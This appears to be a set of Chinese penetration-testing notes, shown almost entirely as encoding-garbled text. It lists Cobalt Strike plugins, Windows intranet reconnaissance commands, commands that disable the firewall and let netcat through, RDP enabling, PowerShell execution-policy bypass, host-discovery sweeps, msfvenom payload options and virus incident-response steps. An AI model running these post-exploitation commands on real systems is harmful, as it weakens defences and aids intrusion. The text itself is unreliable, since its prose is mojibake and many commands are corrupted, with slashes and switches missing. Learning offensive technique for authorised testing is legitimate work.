è¿™å°±æ˜¯è¿™ä¸ªå·¥å…·çš„å¼ºå¤§ä¹‹å¤„ï¼Œé›†æˆäº†å¾ˆå¤šçš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬æˆ‘ä»¬å‰é¢è®²åˆ°çš„å¾ˆå¤šå·¥å…·ï¼Œæ‰€ä»¥é€šè¿‡è¿™ä¸ªå·¥å…·å°±å¯ä»¥å®Œæˆå†…ç½‘æ¨ªå‘æ¸—é€ã€‚ 1-9-3 CSå†…ç½‘æ¸—é€CSæ’ä»¶ï¼š https://github.com/pandasec888/taowu-cobalt-strike CSæ’ä»¶ï¼š https://github.com/rsmudge/Elevatekit CSæ’ä»¶ï¼š https://github.com/DeEpinGh0st/Erebus CSæ’ä»¶ï¼šhttps://github.com/k8gege/Ladon # å·¨é¾™æ‹‰å†¬\\æ‹‰ç™» å·¨é¾™æ‹‰å†¬\\æ‹‰ç™»ä½¿ç”¨è¯´æ˜ï¼šhttps://mp.weixin.qq.com/s/GQBXCX1fiSLi6gKY3M-JcA 3-27 å†…ç½‘ä¿¡æ¯æ”¶é›†æ€ä¹ˆåšæœ¬æœºä¿¡æ¯æ”¶é›† â€”â€“ ## ç½‘ç»œé…ç½®ï¼Œç³»ç»Ÿå’Œè½¯ä»¶ä¿¡æ¯ï¼ŒæœåŠ¡ä¿¡æ¯ï¼Œè¿›ç¨‹åˆ—è¡¨ï¼Œè®¡åˆ’ä»»åŠ¡ï¼Œç”¨æˆ·ï¼Œç«¯å£ï¼Œè¡¥ä¸ï¼Œé˜²ç«å¢™é…ç½® æƒé™æŸ¥è¯¢ â€”â€“ ## å½“å‰ç”¨æˆ·æƒé™ï¼ŒæŒ‡å®šç”¨æˆ·æƒé™ åˆ¤æ–­å­˜ä¸å­˜åœ¨åŸŸ â€”â€”- ## ipconfigæŸ¥è¯¢ï¼ŒæŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯ï¼ŒæŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯ï¼Œåˆ¤æ–­ä¸»åŸŸ æ¢æµ‹åŸŸå†…å­˜ä¸»æœº â€”- ## NetBIOSå¿«é€Ÿæ¢æµ‹ï¼ŒICMPåè®®æ¢æµ‹ï¼ŒARPåè®®æ¢æµ‹ç­‰ 1ã€åŸºæœ¬ä¿¡æ¯æ”¶é›† ## è¿›ç¨‹åˆ—è¡¨ï¼Œç‰ˆæœ¬ï¼Œè¡¥ä¸ï¼ŒæœåŠ¡ï¼Œä»»åŠ¡ï¼Œé˜²æŠ¤ 2ã€ç”¨æˆ·ä¿¡æ¯æ”¶é›† ## åŸŸç”¨æˆ·ï¼Œæœ¬åœ°ç”¨æˆ·ï¼Œç”¨æˆ·æƒé™ï¼Œç»„ä¿¡æ¯â€¦ 3ã€ç½‘ç»œä¿¡æ¯æ”¶é›† ## ç«¯å£ï¼Œç¯å¢ƒï¼Œä»£ç†é€šé“â€¦ 1.è·å–æœ¬æœºç½‘ç»œé…ç½®ä¿¡æ¯ ipconfig all 2.æ“ä½œç³»ç»Ÿå’Œè½¯ä»¶ä¿¡æ¯ #1.æ“ä½œç³»ç»ŸåŠå…¶ç‰ˆæœ¬ä¿¡æ¯ systeminfo | findstr B C:â€OS åç§°â€ C:â€OS ç‰ˆæœ¬â€ #2.ç³»ç»Ÿä½“ç³»ç»“æ„ echo %PROCESSOR_ARCHITECTURE% #3.å®‰è£…çš„è½¯ä»¶åŠç‰ˆæœ¬ï¼Œè·¯å¾„ç­‰ ## åˆ©ç”¨wmicå‘½ä»¤ï¼Œå°†ç»“æœè¾“å‡ºåˆ°æ–‡æœ¬æ–‡ä»¶ wmic product get name,version ## åˆ©ç”¨powershellï¼Œæ”¶é›†è½¯ä»¶çš„ç‰ˆæœ¬ä¿¡æ¯ powershell â€œGet-WmiObject -class Win32_Product |Select-Object -Property name,versionâ€ 3.æŸ¥è¯¢æœ¬æœºæœåŠ¡ä¿¡æ¯ wmic service list brief 4.æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨ ## å¯ä»¥æŸ¥çœ‹åˆ°å½“å‰è¿›ç¨‹åˆ—è¡¨å’Œç”¨æˆ·ï¼Œåˆ†æè½¯ä»¶ï¼Œé‚®ä»¶å®¢æˆ·ï¼ŒVPNå’Œæ€æ¯’è½¯ä»¶ç­‰è¿›ç¨‹ tasklist ## æŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ wmic process list brief 5.æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯ wmic startup get command,caption 6.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡ schtasks query fo LIST v 7.æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´ net statistics workstation 8.æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨ ## æŸ¥çœ‹æœ¬æœºç”¨æˆ·åˆ—è¡¨ net user ## è·å–æœ¬åœ°ç®¡ç†å‘˜ä¿¡æ¯ net localgroup administrators 9.åˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯ net session 10.æŸ¥è¯¢ç«¯å£åˆ—è¡¨ netstat -ano 11.æŸ¥çœ‹è¡¥ä¸åˆ—è¡¨ ## æŸ¥çœ‹ç³»ç»Ÿçš„è¯¦ç»†ä¿¡æ¯ systeminfo ## æŸ¥çœ‹å®‰è£…åœ¨ç³»ç»Ÿä¸­çš„è¡¥ä¸ wmic qfe get Caption,Description,HotFixID,InstalledOn 12.æŸ¥è¯¢æœ¬æœºå…±äº«åˆ—è¡¨ net share ## åˆ©ç”¨wmicå‘½ä»¤æŸ¥æ‰¾ wmic share get name,path,status 13.æŸ¥è¯¢è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨æ¥å£çš„ARPç¼“å­˜è¡¨ route print arp -a 14.æŸ¥è¯¢é˜²ç«å¢™é…ç½® ## å…³é—­é˜²ç«å¢™ ## win server 2003ä¹‹å‰çš„ç‰ˆæœ¬ netsh firewall set opmode disable ## win server 2003ä¹‹åçš„ç‰ˆæœ¬ netsh advfirewall set allprofiles state off ## æŸ¥çœ‹é˜²ç«å¢™é…ç½® netsh firewall show config ## ä¿®æ”¹é˜²ç«å¢™é…ç½® #1.å…è®¸æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥ ## win server 2003ä¹‹å‰çš„ç‰ˆæœ¬ netsh firewall add allowedprogram C: c.exe â€œallow ncâ€ enable ## win server 2003ä¹‹åçš„ç‰ˆæœ¬ netsh advfirewall firewall add rule nameâ€pass ncâ€ dirin actionallow programâ€C: c.exeâ€ #2.å…è®¸æŒ‡å®šç¨‹åºé€€å‡º netsh advfirewall firewall add rule nameâ€Allow ncâ€ dirout actionallow programâ€C: c.exeâ€ #3.å…è®¸3389ç«¯å£æ”¾è¡Œ netsh advfirewall firewall add rule nameâ€Allow ncâ€ dirout actionallow programâ€C: c.exeâ€ #4.è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—çš„å­˜å‚¨ä½ç½® netsh advfirewall set currentprofile logging filename â€œC:\\windows\\temp\\fw.logâ€ 15.æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ reg query â€œHKEY_CURRENT_USER\\Software\\Micrsoft\\Windows\\CurrentVersion\\Internet Settingsâ€ 16.æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡ ## æŸ¥çœ‹è¿œç¨‹è¿æ¥ç«¯å£ ## åœ¨cmdç¯å¢ƒä¸­æ‰§è¡Œæ³¨å†Œè¡¨æŸ¥è¯¢è¯­å¥ï¼Œè¿æ¥ç«¯å£ä¸º0x3dï¼Œè½¬æ¢åä¸º3389 REG QUERY â€œHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControSet\\Control\\Terminal Server\\WinStations\\RDP-Tcpâ€ V PortNumber ## åœ¨windows server 2003ä¸­å¼€å¯3389ç«¯å£ wmic path win32_terminalservicesetting where (_CLASS ! â€œâ€) call setallowsconnections 1 ## åœ¨windows server 2008å’Œ2012ä¸­å¼€å¯3389ç«¯å£ wmic namespace:\\root\\cimv2\\terminalservices path win32_terminalservicesetting where (_CLASS !â€â€) call setallowtsconnections 1 wmic namespace:\\root\\cimv2\\terminalserver path win32_tsgenralsetting where (TerminalNameâ€™RDP-Tcpâ€™) call setuserauthenticationrequired 1 reg add â€œHKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVERâ€ v fSingleSessionPerUser t REG_DWORD d 0 f ä¸‰ã€æƒé™æŸ¥è¯¢ 1.æŸ¥çœ‹å½“å‰æƒé™ whoami ## å¦‚æœå†…ç½‘ä¸­å­˜åœ¨åŸŸï¼Œé‚£ä¹ˆæœ¬åœ°æ™®é€šç”¨æˆ·åªèƒ½æŸ¥è¯¢æœ¬æœºç›¸å…³ä¿¡æ¯ï¼Œä¸èƒ½æŸ¥è¯¢åŸŸå†…ä¿¡æ¯ï¼Œè€Œæœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·å’ŒåŸŸå†…ç”¨æˆ·å¯ä»¥æŸ¥è¯¢åŸŸå†…ä¿¡æ¯ã€‚ ## æœ¬åœ°ç®¡ç†å‘˜Administratoræƒé™å¯ä»¥ç›´æ¥æå‡ä¸ºNtauthorityæˆ–Systemæƒé™ï¼Œå› æ­¤ï¼Œåœ¨åŸŸä¸­ï¼Œé™¤æ™®é€šç”¨æˆ·å¤–ï¼Œæ‰€æœ‰æœºå™¨éƒ½æœ‰ä¸€ä¸ªæœºå™¨ç”¨æˆ·ï¼ˆç”¨æˆ·åæ˜¯æœºå™¨ååŠ ä¸Š$ï¼‰ï¼Œåœ¨æœ¬è´¨ä¸Šï¼Œæœºå™¨çš„systemç”¨æˆ·å¯¹åº”çš„å°±æ˜¯åŸŸé‡Œé¢çš„æœºå™¨ç”¨æˆ·ï¼Œæ‰€ä»¥ï¼Œä½¿ç”¨systemæƒé™å¯ä»¥è¿è¡ŒåŸŸå†…æŸ¥è¯¢å‘½ä»¤ 2.è·å–åŸŸSID whoami all 3.æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ net user ç”¨æˆ·å domain å››ã€åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ 1.ipconfigæŸ¥è¯¢ ## æŸ¥çœ‹ç½‘å…³IPåœ°å€ï¼ŒDNSçš„IPåœ°å€ï¼ŒåŸŸåï¼Œæœ¬æœºæ˜¯å¦å’ŒDNSæœåŠ¡å™¨å¤„äºåŒä¸€ç½‘æ®µï¼Œç„¶åé€šè¿‡åå‘nslookupæ¥è§£æåŸŸåçš„IPåœ°å€ï¼Œç”¨è§£æå¾—åˆ°çš„IPåœ°å€è¿›è¡Œå¯¹æ¯”ï¼Œåˆ¤æ–­åŸŸæ§åˆ¶å™¨å’ŒDNSæœåŠ¡å™¨æ˜¯å¦åœ¨åŒä¸€æœåŠ¡å™¨ä¸Š 2.æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯ systeminfo ## åŸŸå³åŸŸåï¼Œç™»å½•æœåŠ¡å™¨ä¸ºåŸŸæ§åˆ¶å™¨ï¼Œå¦‚æœåŸŸä¸ºWORKGROUPï¼Œè¡¨ç¤ºå½“å‰æœåŠ¡å™¨ä¸åœ¨åŸŸå†… 3.æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯ net config workstation 4.åˆ¤æ–­ä¸»åŸŸ net time domain ## æ‰§è¡Œä¹‹åé€šå¸¸æœ‰ä¸‰ç§æƒ…å†µï¼šå­˜åœ¨åŸŸï¼Œä½†å½“å‰ç”¨æˆ·ä¸æ˜¯åŸŸç”¨æˆ·ï¼›å­˜åœ¨åŸŸï¼Œä¸”å½“å‰ç”¨æˆ·æ˜¯åŸŸç”¨æˆ·ï¼›å½“å‰ç½‘ç»œç¯å¢ƒä¸ºå·¥ä½œç»„ï¼Œä¸å­˜åœ¨åŸŸ äº”ã€æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº 1.NetBIOSå¿«é€Ÿæ¢æµ‹ ## NetBIOSæ˜¯å±€åŸŸç½‘ç¨‹åºä½¿ç”¨çš„ä¸€ç§åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£(API)ï¼Œä¸ºç¨‹åºæä¾›äº†è¯·æ±‚ä½çº§åˆ«æœåŠ¡çš„ç»Ÿä¸€çš„å‘½ä»¤é›†ï¼Œä¸ºå±€åŸŸç½‘æä¾›äº†ç½‘ç»œåŠå…¶ä»–ç‰¹æ®ŠåŠŸèƒ½ã€‚å‡ ä¹æ‰€æœ‰çš„å±€åŸŸç½‘éƒ½æ˜¯åœ¨ NetBIOS åè®®çš„åŸºç¡€ä¸Šå·¥ä½œçš„ã€‚NetBIOS ä¹Ÿæ˜¯è®¡ç®—æœºçš„æ ‡è¯†åï¼Œä¸»è¦ç”¨äºå±€åŸŸç½‘ä¸­è®¡ç®—æœºçš„äº’è®¿ã€‚NetBIOS çš„å·¥ä½œæµç¨‹å°±æ˜¯æ­£å¸¸çš„æœºå™¨åè§£ææŸ¥è¯¢åº”ç­”è¿‡ç¨‹ï¼Œå› æ­¤æ¨èä¼˜å…ˆä½¿ç”¨ã€‚nbtscan æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºæ‰«ææœ¬åœ°æˆ–è¿œç¨‹TCPIPç½‘ç»œä¸Šçš„å¼€æ”¾ NetBIOS åç§°æœåŠ¡å™¨ã€‚nbtscan æœ‰ Windows å’Œ Linux ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä½“ç§¯å¾ˆå°ï¼Œä¸éœ€è¦å®‰è£…ç‰¹æ®Šçš„åº“æˆ– DLL å°±èƒ½ä½¿ç”¨ã€‚ 2.ICMPåè®®æ¢æµ‹ ## ä¾æ¬¡å¯¹å†…ç½‘ä¸­çš„æ¯ä¸ªIPåœ°å€æ‰§è¡Œpingå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¢æµ‹æ•´ä¸ªCæ®µ for L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr â€œTTLâ€ 3.ARPåè®®æ¢æµ‹ ï¼ˆ1ï¼‰arp-sacnå·¥å…· ## å°†arp.exeä¸‹è½½åˆ°æœºå™¨ä¸Šè¿è¡Œï¼Œå¯ä»¥è‡ªå®šä¹‰æ©ç ï¼ŒæŒ‡å®šæ‰«æèŒƒå›´ï¼Œkaliä¸­ä¹Ÿå¸¦æœ‰æ­¤å·¥å…· arp.exe -t 192.168.1.020 ï¼ˆ2ï¼‰Empireä¸­çš„arpsacnæ¨¡å— ## ç”¨äºåœ¨å±€åŸŸç½‘å†…å‘é€ARPåŒ…ï¼Œæ”¶é›†æ´»è·ƒä¸»æœºçš„IPå’ŒMACåœ°å€ï¼Œåœ¨Empireä¸­è¾“å…¥ä¸€ä¸‹å‘½ä»¤å¯ä»¥ä½¿ç”¨arpscanæ¨¡å— usemodule situational_awarenessnetworkarpscan ï¼ˆ3ï¼‰Nishangä¸­çš„Invoke-ARPScan.ps1è„šæœ¬ ## å¯ä»¥å°†è„šæœ¬ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºä¸­è¿è¡Œï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¿œç¨‹åŠ è½½è„šæœ¬ï¼Œè‡ªå®šä¹‰æ©ç å’Œæ‰«æèŒƒå›´ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š powershell.exe -exec bypass -Command â€œ {Import-Module C:\\windows\\temp\\Invoke-ARPScan,psl; Invoke-ARPScan -CIDR 192.168.1.020}â€ C:\\windows\\temp\\log.txt (4)é€šè¿‡TCPIPç«¯å£æ¢æµ‹å†…ç½‘ ä½¿ç”¨sacnlineå·¥å…· scanline -h -t 22.80-89,110,3389,3306 -u 53,161,137,139 -o c:\\windows\\temp\\log.txt -p 192.168.1.1-254 b 3-28 å¯¹å¸¸è§ç—…æ¯’çš„åº”æ€¥å“åº”## è •è™«ç—…æ¯’ï¼š å®šä¹‰ï¼šä¸€ç§è‡ªåŒ…å«çš„ç¨‹åºï¼Œæ¯å…¥ä¾µåˆ°æ–°çš„è®¡ç®—æœºå°±ä¼šè¿›è¡Œå¤åˆ¶è‡ªèº«å¹¶æ‰§è¡Œ ç‰¹ç‚¹ï¼šæœåŠ¡å™¨ä¸æ–­å‘å¤–ç½‘å‘èµ·ä¸»åŠ¨è¿æ¥ç­‰ åº”æ€¥å“åº”ï¼š 1.å°†æ„ŸæŸ“ç—…æ¯’çš„ä¸»æœºä»å†…ç½‘éš”ç¦» 2.ä½¿ç”¨Dç›¾ååŠ©æŸ¥æ€ç«¯å£è¿æ¥æƒ…å†µï¼Œé€šè¿‡ç«¯å£å¼‚å¸¸è·Ÿè¸ªè¿›ç¨‹ID 3.å…¨ç›˜æ‰«æï¼Œå®šä½å¼‚å¸¸æ–‡ä»¶ 4.ä½¿ç”¨å¤šå¼•æ“åœ¨çº¿ç—…æ¯’å¯¹å¼‚å¸¸æ–‡ä»¶æ‰«æï¼ŒæŸ¥çœ‹æ„ŸæŸ“å“ªç§è •è™«ç—…æ¯’ 5.å…³é—­å¼‚å¸¸ç«¯å£ã€æ¸…é™¤æ–‡ä»¶ã€ä½¿ç”¨ä¸“ç”¨ç—…æ¯’å·¥å…·å¯¹æœåŠ¡å™¨è¿›è¡Œæ¸…æŸ¥ ç½‘é¡µç¯¡æ”¹ï¼š ç±»å‹ï¼šæ˜æ˜¾ç¯¡æ”¹ã€éšè—å¼ åŸç†ï¼šæ˜æ˜¾çš„ç½‘é¡µç¯¡æ”¹å³æ”»å‡»è€…å¯ç‚«è€€è‡ªå·±çš„æŠ€æœ¯æŠ€å·§ï¼Œæˆ–è¡¨æ˜è‡ªå·±çš„è§‚ç‚¹ï¼Œå¦‚ä¹‹å‰çš„æŸä¸­å­¦å®˜ç½‘è¢«é»‘äº‹ä»¶ï¼›éšè—å¼ç¯¡æ”¹ä¸€èˆ¬æ˜¯å°†è¢«æ”»å‡»ç½‘ç«™çš„ç½‘é¡µæ¤å…¥é“¾æ¥è‰²æƒ…ã€è¯ˆéª—ç­‰éæ³•ä¿¡æ¯çš„é“¾æ¥ä¸­ï¼Œä»¥é€šè¿‡ç°é»‘è‰²äº§ä¸šç‰Ÿå–éæ³•ç»æµåˆ©ç›Šã€‚ åº”æ€¥å“åº”ï¼š 1.æŸ¥æ‰¾è¿‘æ®µæ—¶é—´å†…è¢«ç¯¡æ”¹çš„æ–‡ä»¶æˆ–è€…æ–°å¢çš„æ–‡ä»¶ï¼ŒæŸ¥çœ‹è¢«ç¯¡æ”¹æ–‡ä»¶æˆ–æ–°å¢æ–‡ä»¶çš„æœ€åä¿®æ”¹æ—¶é—´ï¼Œç¡®å®šæ˜¯å¦ä¸ºè‡ªå·±ä¿®æ”¹æˆ–æ–°å¢ 2.æ‰“å¼€è¢«ç¯¡æ”¹çš„æ–‡ä»¶ï¼Œæ£€æŸ¥é‡Œé¢æœ‰æ— æ–°å¢æ¶æ„ä»£ç æˆ–è¢«ç¯¡æ”¹äº†å…¶ä»–å†…å®¹ 3.å¦‚æœè¢«ç¯¡æ”¹æ–‡ä»¶æ²¡è¢«ä¿®æ”¹ï¼Œå°±è¯´æ˜å¯èƒ½è¢«ç¯¡æ”¹çš„å†…å®¹è¢«æ³¨å…¥æ•°æ®åº“ä¸­ï¼Œç½‘ç«™æœ‰æ³¨å…¥æ¼æ´ï¼Œå…ˆæŠŠæ³¨å…¥æ¼æ´è¡¥ä¸Šï¼Œåœ¨æŠŠè¢«æ³¨å…¥åˆ°æ•°æ®åº“çš„å†…å®¹æ¸…é™¤ å‹’ç´¢ç—…æ¯’ï¼š åŸç†ï¼šå‹’ç´¢ç—…æ¯’ï¼Œæ˜¯ä¸€ç§ä¼´éšæ•°å­—è´§å¸å…´èµ·çš„ç—…æ¯’æœ¨é©¬ï¼Œä¸»è¦ä»¥é‚®ä»¶ã€ç¨‹åºæœ¨é©¬ã€ç½‘é¡µæŒ‚é©¬çš„å½¢å¼è¿›è¡Œä¼ æ’­ã€‚è¿™ç§ç—…æ¯’åˆ©ç”¨å„ç§åŠ å¯†ç®—æ³•å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼Œå‹’ç´¢ç—…æ¯’ä¸€èˆ¬åˆ©ç”¨éå¯¹ç§°åŠ å¯†ç®—æ³•å’Œå¯¹ç§°åŠ å¯†ç®—æ³•ç»„åˆçš„å½¢å¼å¯¹å—å®³è€…æ–‡ä»¶è¿›è¡ŒåŠ å¯†ã€‚ ç‰¹ç‚¹ï¼šä¸­æ¯’çš„ä¸šåŠ¡ç³»ç»Ÿæ— æ³•è®¿é—®ã€æ–‡ä»¶åç¼€è¢«ç¯¡æ”¹ã€å‹’ç´¢ä¿¡å±•ç¤ºç­‰ åº”æ€¥å“åº”ï¼š 1.éš”ç¦»è¢«æ„ŸæŸ“çš„æœåŠ¡å™¨ä¸»æœº 2.æ’æŸ¥ä¸šåŠ¡ç³»ç»Ÿ 3.åˆ©ç”¨ç•™ä¸‹çš„å‹’ç´¢ä¿¡æ¯ï¼Œç¡®å®šå‹’ç´¢ç—…æ¯’çš„ç§ç±»ï¼Œå†è¿›è¡Œæº¯æºåˆ†æ 4.å¤„ç½®å‹’ç´¢ç—…æ¯’ï¼š (1)å¼‚å¸¸æ–‡ä»¶æ£€æŸ¥å¹¶æ¸…é™¤ (2)è¡¥ä¸æ£€æŸ¥ï¼Œæ²¡è¡¥ä¸æ‰“è¡¥ä¸ (3)å¯¹è´¦å·è¿›è¡Œæ’æŸ¥ï¼Œåˆ é™¤å¯ç–‘è´¦å· (4)å¼‚å¸¸è¿›ç¨‹ã€è¿æ¥æ’æŸ¥ï¼Œæ€æ‰å¯ç–‘è¿›ç¨‹ï¼Œæ–­å¼€å¼‚å¸¸è¿æ¥ (5)è®¡åˆ’ä»»åŠ¡æ’æŸ¥ (6)å¯¹ç½‘ç»œæµé‡è¿›è¡Œæ’æŸ¥ 5.æ¸…é™¤åŠ å›ºåŠ å®‰å…¨è®¾å¤‡ æŒ–çŸ¿ç—…æ¯’ï¼š ç‰¹ç‚¹ï¼š åˆ©ç”¨æ„ŸæŸ“ä¸»æœºä¸æŒ–çŸ¿åŸŸåè¿æ¥è¿›è¡ŒæŒ–çŸ¿ï¼Œæ„ŸæŸ“ä¸»æœºå‡ºç°ä¸»æœºå¡é¡¿å’ŒCPUå ç”¨é«˜ç­‰ç°è±¡ åº”æ€¥å“åº”ï¼š 1.éš”ç¦»ä¸»æœºï¼Œé˜»æ–­ä¼ æ’­ 2. topå‘½ä»¤æŸ¥çœ‹CPUå ç”¨ ï¼ŒæŸ¥çœ‹CPUå ç”¨è¾ƒé«˜çš„è¿›ç¨‹ 3. é€šè¿‡PIDè·å¾—å¯¹åº”è¿›ç¨‹ç›®å½•å’Œè¿›ç¨‹ï¼Œ å®šä½è¿›ç¨‹ç›®å½•æˆ–æ–‡ä»¶ 4. é€šè¿‡æ²™ç®±åˆ†ææ–‡ä»¶ï¼Œç¡®å®šç—…æ¯’ç§ç±»å’Œç—…æ¯’è¡Œä¸º 5.å¯¹å¼‚å¸¸æ–‡ä»¶è¿›è¡Œåˆ†æ 6. æ’æŸ¥è®¡åˆ’ä»»åŠ¡ 7. æ’æŸ¥sshå…¬é’¥ 8. é€šè¿‡etcrc.localæ’æŸ¥ä¸»æœºå¯åŠ¨é¡¹ 9.æ’æŸ¥è´¦æˆ· 10. æŸ¥çœ‹ä¸»æœºæ—¥å¿— 11. æŸ¥çœ‹å®šæ—¶ä»»åŠ¡ 12.æ¸…é™¤åŠ å›º å››ï¼Œkali4-1 msf4-1-1 msfconsoleä»‹ç»msfconsoleç®€ç§°msfæ˜¯ä¸€æ¬¾å¸¸ç”¨çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼ŒåŒ…å«äº†å¸¸è§çš„æ¼æ´åˆ©ç”¨æ¨¡å—å’Œç”Ÿæˆå„ç§æ¸—é€æ–‡ä»¶ï¼Œåˆ©ç”¨ç½‘ç«™ï¼Œæ‰‹æœºç­‰çš„æ¼æ´å°†åˆ°ç›®æ ‡é¶æœºï¼Œæ“æ§ç›®æ ‡é¶æœºâ€¦è¿™è¾¹ä»…ä¾›å­¦ä¹ ä½¿ç”¨! æ‰“å¼€ç»ˆç«¯ï¼Œæ£€æŸ¥ç¯å¢ƒæ˜¯å¦å®‰è£…ã€‚è¾“å…¥å‘½ä»¤ï¼š msfconsole æ³¨ï¼šé»˜è®¤kali é¢„è£…äº†metasploit-frameworkï¼Œå³msfconsoleå‘½ä»¤ï¼Œå¦‚æœæ²¡æœ‰æˆ–æç¤ºï¼šmsfconsole:commad not foundï¼Œè¯·è‡ªè¡Œå®‰è£…ï¼š apt install metasploit-framework 4-1-2 ç”Ÿæˆpyloadå‚æ•°ä»‹ç»-p, â€“payload payload ## æŒ‡å®šéœ€è¦ä½¿ç”¨çš„payload(æ”»å‡»è·è½½)ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰payload,å‡ ä¹æ˜¯æ”¯æŒå…¨å¹³å°çš„ -l, â€“list [module_type] # åˆ—å‡ºæŒ‡å®šæ¨¡å—çš„æ‰€æœ‰å¯ç”¨èµ„æº. æ¨¡å—ç±»å‹åŒ…æ‹¬: payloads, encoders, nops, all -n, â€“nopsled length # ä¸ºpayloadé¢„å…ˆæŒ‡å®šä¸€ä¸ªNOPæ»‘åŠ¨é•¿åº¦ -f, â€“format format # æŒ‡å®šè¾“å‡ºæ ¼å¼ (ä½¿ç”¨ â€“help-formats æ¥è·å–msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨) -e, â€“encoder [encoder] # æŒ‡å®šéœ€è¦ä½¿ç”¨çš„encoderï¼ˆç¼–ç å™¨ï¼‰,æŒ‡å®šéœ€è¦ä½¿ç”¨çš„ç¼–ç ï¼Œå¦‚æœæ—¢æ²¡ç”¨-eé€‰é¡¹ä¹Ÿæ²¡ç”¨-bé€‰é¡¹ï¼Œåˆ™è¾“å‡ºraw payload -a, â€“arch architecture # æŒ‡å®špayloadçš„ç›®æ ‡æ¶æ„ï¼Œä¾‹å¦‚x86 | x64 | x86_64 â€“platform platform æŒ‡å®špayloadçš„ç›®æ ‡å¹³å° -s, â€“space length # è®¾å®šæœ‰æ•ˆæ”»å‡»è·è½½çš„æœ€å¤§é•¿åº¦ï¼Œå°±æ˜¯æ–‡ä»¶å¤§å° -b, â€“bad-chars list # è®¾å®šè§„é¿å­—ç¬¦é›†ï¼ŒæŒ‡å®šéœ€è¦è¿‡æ»¤çš„åå­—ç¬¦ä¾‹å¦‚ï¼šä¸ä½¿ç”¨ â€˜\\x0fâ€™ã€â€™\\x00â€™; -i, â€“iterations count æŒ‡å®špayloadçš„ç¼–ç æ¬¡æ•° -c, â€“add-code path # æŒ‡å®šä¸€ä¸ªé™„åŠ çš„win32 shellcodeæ–‡ä»¶ -x, â€“template path # æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å¯æ‰§è¡Œæ–‡ä»¶ä½œä¸ºæ¨¡æ¿,å¹¶å°†payloadåµŒå…¥å…¶ä¸­ -k, â€“keep # ä¿æŠ¤æ¨¡æ¿ç¨‹åºçš„åŠ¨ä½œï¼Œæ³¨å…¥çš„payloadä½œä¸ºä¸€ä¸ªæ–°çš„è¿›ç¨‹è¿è¡Œ â€“payload-options # åˆ—ä¸¾payloadçš„æ ‡å‡†é€‰é¡¹ -o, â€“out path # æŒ‡å®šåˆ›å»ºå¥½çš„payloadçš„å­˜æ”¾ä½ç½® -v, â€“var-name name # æŒ‡å®šä¸€ä¸ªè‡ªå®šä¹‰çš„å˜é‡ï¼Œä»¥ç¡®å®šè¾“å‡ºæ ¼å¼ â€“shellest # æœ€å°åŒ–ç”Ÿæˆpayload -h, â€“help # æŸ¥çœ‹å¸®åŠ©é€‰é¡¹ â€“help-formats # æŸ¥çœ‹msfæ”¯æŒçš„è¾“å‡ºæ ¼å¼åˆ—è¡¨ 4-1-3 msfæ§åˆ¶å°å‚æ•°è¿ç”¨- banner #è¿™ä¸ªä¸»è¦æ˜¯æŸ¥çœ‹metasploitçš„ç‰ˆæœ¬ä¿¡æ¯ï¼Œåˆ©ç”¨æ¨¡å—æ•°é‡ã€payloadæ•°é‡ç­‰ç­‰ã€‚ - use #è¿™ä¸ªæ˜¯ä½¿ç”¨å‚æ•°ã€‚å¦‚ä½ è¦ä½¿ç”¨åˆ°æŸä¸ªåˆ©ç”¨æ¨¡å—ï¼Œpayloadç­‰ï¼Œé‚£ä¹ˆå°±è¦ä½¿ç”¨åˆ°useå‚æ•° - Search #å½“ä½ ä½¿ç”¨msfconsoleçš„æ—¶å€™ï¼Œä½ ä¼šç”¨åˆ°å„ç§æ¼æ´æ¨¡å—ã€å„ç§æ’ä»¶ç­‰ç­‰ã€‚æ‰€ä»¥searchå‘½ä»¤å°±å¾ˆé‡è¦ã€‚ ä½¿ç”¨å‘½ä»¤ help search å¯ä»¥æŸ¥çœ‹å…·ä½“ä½¿ç”¨æ–¹æ³•ï¼› å…¶ä»–ä½¿ç”¨æ–¹æ³•ï¼š æŸ¥mysql:search name:mysql; æŸ¥joomla:search joomla;æŸ¥ubutuæ¼æ´ï¼šsearchsploit ubuntu 16.04ï¼›æŸ¥ms08-067æ¼æ´ï¼šsearch ms08-067 